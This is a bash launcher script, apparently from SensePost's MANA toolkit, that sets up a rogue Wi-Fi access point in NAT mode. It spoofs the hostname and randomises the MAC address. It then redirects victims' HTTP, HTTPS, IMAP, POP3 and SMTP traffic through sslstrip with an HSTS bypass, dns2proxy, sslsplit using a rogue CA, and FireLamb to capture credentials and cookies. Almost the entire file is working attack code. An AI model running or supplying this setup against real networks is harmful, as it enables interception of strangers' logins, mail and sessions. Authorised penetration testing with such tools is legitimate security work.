#!/bin/bash
# Original script by Dominic White and Ian de Villiers
# Changes made by John & Daniel Cuthbert 

# Other Useful variables defined
upstream=eth0
# phy=wlan0
conf=/etc/mana-toolkit/hostapd-karma.conf
hostapd=/usr/lib/mana-toolkit/hostapd
ifwl="(ifconfig | grep wlan*)"
S1='y'
S2='n'

clear

echo -e "\033[38;5;220m--------------------------------------------------\033[39m"
echo -e "\033[38;5;220m Welcome to SensePost's MANA \033[39m"
echo -e "\033[38;5;220m Making Rogue Access Points fun for all \033[39m"
echo -e "\033[38;5;220m @SensePost / http://sensepost.com \033[39m"
echo 
echo -e "\033[38;5;220m This script starts up will start MANA \033[39m"
echo -e "\033[38;5;220m in NAT mode, with the following: \033[39m"
echo -e
echo -e "\033[38;5;160m	Firelamb \033[39m"
echo -e "\033[38;5;160m sslstrip \033[39m"
echo -e "\033[38;5;160m	sslsplit \033[39m"
echo -e  
echo -e "\033[38;5;220m You will, however, need an upstream link \033[39m" 
echo -e
echo -e "\033[38;5;220m Press ENTER to continue \033[39m"
echo -e
echo -e "\033[38;5;220m--------------------------------------------------\033[39m"

read

# Prompts the user to ensure their hardware is compatable and properly configured
echo -e "\033[38;5;220mFor this system to work you will need to ensure you have the follwing:\033[39m"
echo -e
echo -e "\033[38;5;220m1. An active network connection for your 'upstream' traffic on eth0\033[39m"
echo -e "\033[38;5;220m2. A wireless network interface that supports 'Master Mode' (For best results use a device with an AR9271 chipset)\033[39m"
echo -e

# Confirmation to continue
function confirm()
{
echo -e "\033[38;5;220mWould you like to proceed?\033[39m"
echo -e
echo -e "\033[38;5;220mENTER y/n\033[39m"
read yn
if [ $yn == "$S1" ]
then
	echo -e "\033[38;5;120m Checking for an active network connection on eth0\033[39m"

elif [ $yn == "$S2" ]
then
	echo -e "\033[38;5;160mEXITING...${nc}\033[39m" && exit

else
	echo -e "Answer must entered as either 'y' or 'n'" && confirm

fi

# This detects wireless interfaces and exits if no suitable interfaces are found

ntst="$(ping 8.8.8.8 -c 1 -I eth0 | grep received | cut -f 2 -d ',' | cut -f 2 -d ' ')"  
if [ "${ntst}" = '1' ]
	then
		echo -e "\033[38;5;120m Whoop!! an active network connection has been detected\033[39m"

	else
		echo -e "\033[38;5;160m Arse, no active network connection was detected, You should fix this, I'm going to exit now\033[39m" && exit

fi

}

confirm


function detect()
{
echo -e "\033[38;5;120m Detecting wireless interfaces...\033[39m"

echo -e "\033[38;5;120m I've found the following available:\033[39m"
echo -e
ifconfig | grep wlan*
if [ "${ifwl}" == '' ]
then
	echo -e "\033[38;5;160m No wireless interfaces found. Check your antennas batteries and connectors. I'm going to exit now\033[39m" && exit

fi

}

detect


# prompts user to select their wlan from the list found during ifconfig
function sel()
{
echo -e
echo -e "\033[38;5;120m Which wireless interface would you like to use from those available?\033[39m"
read phy

}

sel


# determining wifi suitability
# Checks to ensure that <master mode> is supported by the wireless interface...exits and restarts network-manager if master mode is not supported
function mstrchk()
{
echo -e "\033[38;5;120m Checking that the wlan card is able to run in master mode.\033[39m"
mast="$(iw list | grep '* AP' | head -n1 | cut -d '*' -f 2 | cut -d ' ' -f 2 )"
if [ "${mast}" != 'AP' ]
then
	echo -e "\033[38;5;160m The current wireless interface does not support master mode, I'm going to exit now\033[39m" && exit # service network-manager start && exit

fi

}

mstrchk


# figure out how to change this back to the orignial hostname when finished...perhaps assign the output of <echo /etc/hostname> to a variable and then run <hostname ${vairable name}>???
function nmchng()
{
echo -e "${grn}[+]${nc} Temporarily changing hostname to ${red}WRT54G${nc}."  # Will this change only affect this terminal session.?"
hostname WRT54G
echo hostname WRT54G
sleep 2
}

nmchng

service network-manager stop
rfkill unblock wlan


# runs macchanger on selected wlan interface...Lets consider offering an option to set the MAC to a desired MAC address...
function rndm()
{
echo -e "${grn}[+]${nc} Randomizing MAC address of ${blu}$phy${nc}"
ifconfig $phy down
macchanger -r $phy
ifconfig $phy up
}

rndm




# Assigning new IP Address to Wireless Interface
function dhcp()
{
echo -e "${grn}[+]${nc} Configuring dhcpd"
echo -e "${grn}[+]${nc} (${red}BACKGROUNDED${nc}) Starting hostapd"
echo -e "${grn}[+]${nc} Assigning New Address of ${blu}10.0.0.1${nc} with a netmask of 255.255.255.0 to ${blu}$phy${nc}"
sed -i "s/^interface=.*$/interface=$phy/" $conf
$hostapd $conf&
sleep 5
ifconfig $phy 10.0.0.1 netmask 255.255.255.0
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

dhcpd -cf /etc/mana-toolkit/dhcpd.conf $phy

}

dhcp

echo -e "${grn}[+]${nc} Configuring iptables for best functionality."
echo -e "${red}[!]${nc} iptables will be ${red}FLUSHED${nc} during shutdown, however it is recommended that you confirm this by running 'iptables -L -n' after shutdown"
echo '1' > /proc/sys/net/ipv4/ip_forward
iptables --policy INPUT ACCEPT
iptables --policy FORWARD ACCEPT
iptables --policy OUTPUT ACCEPT
iptables -F
iptables -t nat -F
iptables -t nat -A POSTROUTING -o $upstream -j MASQUERADE
iptables -A FORWARD -i $phy -o $upstream -j ACCEPT
iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1
#iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 192.168.182.1



#SSLStrip with HSTS bypass
echo -e "${grn}[+]${nc} (${red}BACKGROUNDED${nc}) Starting sslstrip with HSTS bypass"
cd /usr/share/mana-toolkit/sslstrip-hsts/
python sslstrip.py -l 10000 -a -w /var/lib/mana-toolkit/sslstrip.log&
iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10000
python dns2proxy.py $phy&
cd -


#SSLSplit
echo -e "${grn}[+]${nc} (${red}BACKGROUNDED${nc}) Starting sslsplit with HSTS bypass"
sslsplit -D -P -Z -S /var/lib/mana-toolkit/sslsplit -c /usr/share/mana-toolkit/cert/rogue-ca.pem -k /usr/share/mana-toolkit/cert/rogue-ca.key -O -l /var/lib/mana-toolkit/sslsplit-connect.log \
 https 0.0.0.0 10443 \
 http 0.0.0.0 10080 \
 ssl 0.0.0.0 10993 \
 tcp 0.0.0.0 10143 \
 ssl 0.0.0.0 10995 \
 tcp 0.0.0.0 10110 \
 ssl 0.0.0.0 10465 \
 tcp 0.0.0.0 10025&
#iptables -t nat -A INPUT -i $phy \
 #-p tcp --destination-port 80 \
 #-j REDIRECT --to-port 10080
iptables -t nat -A PREROUTING -i $phy \
 -p tcp --destination-port 443 \
 -j REDIRECT --to-port 10443
iptables -t nat -A PREROUTING -i $phy \
 -p tcp --destination-port 143 \
 -j REDIRECT --to-port 10143
iptables -t nat -A PREROUTING -i $phy \
 -p tcp --destination-port 993 \
 -j REDIRECT --to-port 10993
iptables -t nat -A PREROUTING -i $phy \
 -p tcp --destination-port 65493 \
 -j REDIRECT --to-port 10993
iptables -t nat -A PREROUTING -i $phy \
 -p tcp --destination-port 465 \
 -j REDIRECT --to-port 10465
iptables -t nat -A PREROUTING -i $phy \
 -p tcp --destination-port 25 \
 -j REDIRECT --to-port 10025
iptables -t nat -A PREROUTING -i $phy \
 -p tcp --destination-port 995 \
 -j REDIRECT --to-port 10995
iptables -t nat -A PREROUTING -i $phy \
 -p tcp --destination-port 110 \
 -j REDIRECT --to-port 10110

# Start FireLamb
echo -e "${grn}[+]${nc} (${red}BACKGROUNDED${nc}) Starting FireLamb"
/usr/share/mana-toolkit/firelamb/firelamb.py -i $phy & ## Does this need to be killed in the bg When shutdown is given???  fkill="(ps aux | grep XXXXXX | cut -b 11-14 | head -n1)"> followed by <pkill ${fkill}>

echo "Hit enter to kill me"
read
echo -e "${red}[!]${nc} Killing dhcpd"
pkill dhcpd
echo -e "${red}[!]${nc} Killing sslstrip"
pkill sslstrip
echo -e "${red}[!]${nc} Killing sslsplit"
pkill sslsplit
echo -e "${red}[!]${nc} Killing hostapd"
pkill hostapd
echo -e "${red}[!]${nc} Killing python"
pkill python
echo -e "${red}[!]${nc} Flushing iptables.  Suggest running 'iptables -L -n' to confirm Flush"
iptables --policy INPUT ACCEPT
iptables --policy FORWARD ACCEPT
iptables --policy OUTPUT ACCEPT
iptables -t nat -F
echo -e "${grn}[+]${nc} Restarting Network Manager"
service network-manager start
echo -e "${grn}[+]${nc} Resetting MAC Address"
echo "...Waiting for network reset..."
sleep 3
ifconfig $phy down
macchanger -p $phy
ifconfig $phy up
echo -e "${red}EXITING...${nc}" && exit

## echo "####################STOP#######################" && exit #DEV Debugging Stop...
